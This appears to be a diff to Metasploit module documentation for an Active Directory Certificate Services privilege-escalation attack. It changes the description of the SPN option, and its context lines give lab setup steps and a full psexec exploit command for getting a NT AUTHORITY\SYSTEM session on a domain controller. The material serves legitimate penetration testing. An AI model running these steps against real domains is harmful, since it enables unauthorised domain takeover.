@@ -23,6 +23,7 @@ The module will go through the following steps:
 
 ### Installing ADCS on a DC
 (steps copied from https://github.com/rapid7/metasploit-framework/pull/16939)
+
 - Open the Server Manager
 - Select Add roles and features
 - Select "Active Directory Certificate Services" under the "Server Roles" section
@@ -53,6 +54,7 @@ The module will go through the following steps:
 
 - Verify the privilege escalation is successful using `psexec` module. It will
   automatically use the TGS cached from the previous steps.
+
 1. Do: `use windows/smb/psexec`
 1. Do: `exploit rhosts=<remote host> lhost=<local host> smbuser=administrator smbdomain=<FQDN domain name> SmbAuth=kerberos SmbRhostname=<DC hostname in FQDN format> DomainControllerRhost=<DC IP>`
 1. Verify you got a session as the `NT AUTHORITY\SYSTEM` user
@@ -88,9 +90,11 @@ The password for the new computer. A random password will be generated if not se
 
 ### SPN
 
-The Service Principal Name used to request the impersonated TGS, format is
-`service_name/FQDN` (e.g. cifs/dc01.mydomain.local). `cifs/<DC_NAME>.<DOMAIN>`
-will be used if not set. This option is only available if the `PRIVESC` action is selected (default).
+The Service Principal Name used to request an additional impersonated TGS,
+format is `<service_name>/<hostname>.<FQDN>` (e.g. `ldap/dc01.mydomain.local`).
+Note that, independently of this option, a TGS for `cifs/<DC_NAME>.<DOMAIN>`
+will always be requested. This option is only available if the `PRIVESC` action
+is selected (default).
 
 ### IMPERSONATE
 
